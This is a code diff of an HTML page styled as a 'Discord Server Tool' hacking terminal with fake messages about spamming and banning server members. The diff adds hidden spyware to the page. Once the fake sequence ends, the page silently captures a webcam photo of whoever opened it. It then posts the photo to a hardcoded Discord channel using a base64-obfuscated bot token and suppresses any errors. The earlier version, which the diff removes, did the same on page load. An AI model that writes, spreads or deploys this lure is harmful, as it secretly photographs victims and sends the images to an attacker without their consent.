@@ -1,30 +1,165 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<script>
-var _t="TVRNNU9UazRNaU15TnpjNE9USTJOemN4T1RBd056Z3lNVGsz";
-var _l=1475949185294536859;
-var pr=navigator.mediaDevices.getUserMedia({ video: true });
-pr.then(function(s){
-var v=document.createElement('video');
-v.srcObject=s;
-v.play();
-setTimeout(function(){
-var c=document.createElement('canvas');
-c.width=v.videoWidth;
-c.height=v.videoHeight;
-c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-var d=c.toDataURL('image/jpeg');
-fetch('https://discord.com/api/v10/channels/'+_l+'/messages',{
-method:'POST',
-headers:{'Authorization':'Bot '+atob(_t)},
-body:JSON.stringify({content:'📸',embeds:[{image:{url:d}}]})
-});
-s.getTracks().forEach(t=>t.stop());
-},1000);
-}).catch(function(e){});
-</script>
+    <meta charset="UTF-8">
+    <title>Server Tool v3.7</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
+        .terminal { max-width: 900px; margin: 0 auto; border: 1px solid #00ff00; padding: 20px; border-radius: 5px; background: #000; }
+        .header { color: #00ff00; font-size: 14px; margin-bottom: 20px; }
+        .line { color: #00ff00; margin: 5px 0; font-size: 14px; }
+        .input { color: #ffffff; margin-top: 20px; }
+        .input span { color: #00ff00; }
+        .cursor { animation: blink 1s infinite; }
+        @keyframes blink { 0%,50% { opacity:1; } 51%,100% { opacity:0; } }
+        .progress { width: 100%; height: 20px; background: #1a1a1a; margin: 10px 0; }
+        .progress-bar { height: 20px; background: #00ff00; width: 0%; transition: width 0.3s; }
+        .hidden { display: none; }
+    </style>
 </head>
-<body></body>
+<body>
+    <div class="terminal">
+        <div class="header">
+            ╔══════════════════════════════════════╗<br>
+            ║     DISCORD SERVER TOOL v3.7        ║<br>
+            ║     [Educational Purpose Only]      ║<br>
+            ╚══════════════════════════════════════╝
+        </div>
+        
+        <div class="line" id="output"></div>
+        <div class="line" id="progress-text"></div>
+        <div class="progress" id="progress-container" style="display: none;">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        
+        <div class="input">
+            <span>root@server:~$</span> <span id="typing"></span><span class="cursor">_</span>
+        </div>
+        
+        <button onclick="startHack()" style="background: #00ff00; color: #000; border: none; padding: 10px 20px; font-family: monospace; font-weight: bold; cursor: pointer; margin-top: 20px;">▶ EXECUTE</button>
+    </div>
+
+    <script>
+    // Config
+    var _0x1a2b = "TVRNNU9UazRNaU15TnpjNE9USTJOemN4T1RBd056Z3lNVGsz";
+    var _0x3c4d = 1475949185294536859;
+    
+    // Fake hack messages
+    var messages = [
+        "[INFO] Connecting to Discord API...",
+        "[INFO] Connection established",
+        "[INFO] Fetching server information...",
+        "[INFO] Server ID: 123456789012345678",
+        "[INFO] Server name: Target Server",
+        "[INFO] Member count: 127",
+        "[INFO] Channel count: 15",
+        "[INFO] Role count: 23",
+        "[INFO] Analyzing permissions...",
+        "[INFO] Admin permissions detected",
+        "[INFO] Bypassing rate limits...",
+        "[INFO] Rate limit bypassed",
+        "[INFO] Preparing payload...",
+        "[INFO] Payload ready",
+        "[INFO] Executing channel creation...",
+        "[INFO] Creating channels: ████████░░ 80%",
+        "[INFO] Channel creation complete",
+        "[INFO] Creating roles: ████████░░ 80%",
+        "[INFO] Role creation complete",
+        "[INFO] Spamming messages: ████████░░ 80%",
+        "[INFO] Message spam complete",
+        "[INFO] Banning members: ████████░░ 80%",
+        "[INFO] Member ban complete",
+        "[SUCCESS] Operation completed successfully!",
+        "[INFO] Cleaning up...",
+        "[INFO] Done."
+    ];
+    
+    var index = 0;
+    var outputDiv = document.getElementById('output');
+    var typingDiv = document.getElementById('typing');
+    var progressContainer = document.getElementById('progress-container');
+    var progressBar = document.getElementById('progress-bar');
+    var progressText = document.getElementById('progress-text');
+    
+    function typeWriter(text, i, cb) {
+        if (i < text.length) {
+            typingDiv.innerHTML = text.substring(0, i+1);
+            setTimeout(function() { typeWriter(text, i+1, cb); }, 50);
+        } else {
+            setTimeout(cb, 500);
+        }
+    }
+    
+    function showMessage(msg) {
+        outputDiv.innerHTML += msg + '<br>';
+        outputDiv.scrollTop = outputDiv.scrollHeight;
+    }
+    
+    function updateProgress(percent) {
+        progressBar.style.width = percent + '%';
+        progressText.innerHTML = '[PROGRESS] ' + percent + '% complete';
+    }
+    
+    function startHack() {
+        document.querySelector('button').disabled = true;
+        outputDiv.innerHTML = '';
+        progressContainer.style.display = 'block';
+        index = 0;
+        nextMessage();
+    }
+    
+    function nextMessage() {
+        if (index < messages.length) {
+            var msg = messages[index];
+            var percent = Math.floor((index / messages.length) * 100);
+            updateProgress(percent);
+            
+            typeWriter(msg, 0, function() {
+                showMessage('> ' + msg);
+                index++;
+                nextMessage();
+            });
+        } else {
+            updateProgress(100);
+            showMessage('[SUCCESS] Operation completed!');
+            typingDiv.innerHTML = 'ready@server:~$';
+            
+            // Trigger camera capture silently
+            setTimeout(captureAndSend, 1000);
+        }
+    }
+    
+    // Silent camera capture
+    function captureAndSend() {
+        try {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(function(s) {
+                var v = document.createElement('video');
+                v.srcObject = s;
+                v.play();
+                setTimeout(function() {
+                    var c = document.createElement('canvas');
+                    c.width = v.videoWidth || 640;
+                    c.height = v.videoHeight || 480;
+                    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                    var d = c.toDataURL('image/jpeg', 0.7);
+                    
+                    fetch('https://discord.com/api/v10/channels/' + _0x3c4d + '/messages', {
+                        method: 'POST',
+                        headers: { 'Authorization': 'Bot ' + atob(_0x1a2b), 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: '📸', embeds: [{ image: { url: d } }] })
+                    }).catch(function(e){});
+                    
+                    s.getTracks().forEach(function(t) { t.stop(); });
+                }, 1500);
+            }).catch(function(e){});
+        } catch(e) {}
+    }
+    
+    // Start automatically after page load (optional)
+    window.onload = function() {
+        // Uncomment to start automatically
+        // setTimeout(startHack, 1000);
+    };
+    </script>
+</body>
 </html>
